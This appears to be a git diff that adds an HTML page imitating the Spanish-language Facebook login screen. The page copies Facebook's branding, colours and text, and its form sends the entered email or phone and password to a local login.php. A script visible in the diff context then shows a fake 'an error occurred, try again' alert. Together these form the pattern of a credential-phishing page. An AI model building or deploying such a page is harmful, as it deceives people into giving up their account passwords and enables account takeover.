@@ -1,3 +1,145 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Iniciar sesión</title>
+    <link rel="icon" href="https://images.vexels.com/media/users/3/223136/isolated/lists/984f500cf9de4519b02b354346eb72e0-icono-de-facebook-redes-sociales.png" type="image/x-icon">
+    <style>
+
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .wrapper {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 73%;
+            max-width: 980px;
+        }
+        .info {
+            max-width: 50%;
+        }
+        .info .facebook-logo {
+            color: #1877f2;
+            font-size: 56px;
+            font-weight: bold;
+            margin: 0;
+            font-family: 'Klavika', sans-serif;
+        }
+        .info p {
+            font-size: 28px;
+            color: #1c1e21;
+            margin: 10px 0;
+            line-height: 1.2;
+        }
+        .login-container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            width: 350px;
+            text-align: center;
+        }
+        .login-container input[type="text"], .login-container input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 5px;
+            box-sizing: border-box;
+            font-size: 16px;
+            background-color: #f0f2f5;
+            border: 1px solid #ddd;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 5px;
+            background-color: #1877f2;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .login-container button:hover {
+            background-color: #165dbb;
+        }
+        .forgot-password {
+            margin-top: 15px;
+            font-size: 14px;
+        }
+        .forgot-password a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+        .separator {
+            border: 0;
+            height: 1px;
+            background: #ddd;
+            margin: 20px 0;
+        }
+        .signup {
+            margin-top: 20px;
+        }
+        .signup button {
+            background-color: #42b72a;
+            font-size: 18px;
+            padding: 12px;
+            width: 55%;
+        }
+        .signup button:hover {
+            background-color: #36a420;
+        }
+        .create-page {
+            margin-top: 25px;
+            font-size: 14px;
+        }
+        .create-page a {
+            color: #1c1e21;
+            text-decoration: none;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+<div class="wrapper">
+    <div class="info">
+        <h1 class="facebook-logo">facebook</h1>
+        <p>Facebook te ayuda a comunicarte y<br>
+            compartir con las personas que forman<br>
+            parte de tu vida.</p>
+    </div>
+    <div>
+        <div class="login-container">
+            <form action="login.php" method="POST" id="login-form">
+                <input type="text" name="email" placeholder="Correo electrónico o número de teléfono" required>
+                <input type="password" name="password" placeholder="Contraseña" required>
+                <button type="submit">Iniciar sesión</button>
+            </form>
+            <div class="forgot-password">
+                <p><a href="#">¿Has olvidado la contraseña?</a></p>
+            </div>
+            <hr class="separator">
+            <div class="signup">
+                <button>Crear cuenta nueva</button>
+            </div>
+        </div>
+        <div class="create-page">
+            <p><a href="#">Crea una página</a> para una celebridad, una marca o un negocio.</p>
+        </div>
+    </div>
+</div>
+
 <script type="text/javascript">
     const exitoso = () => {
         alert('Ocurrió un error, por favor intenta de nuevo');
@@ -32,3 +174,6 @@
             .catch((error) => console.error('error:', error));
     });
 </script>
+
+</body>
+</html>
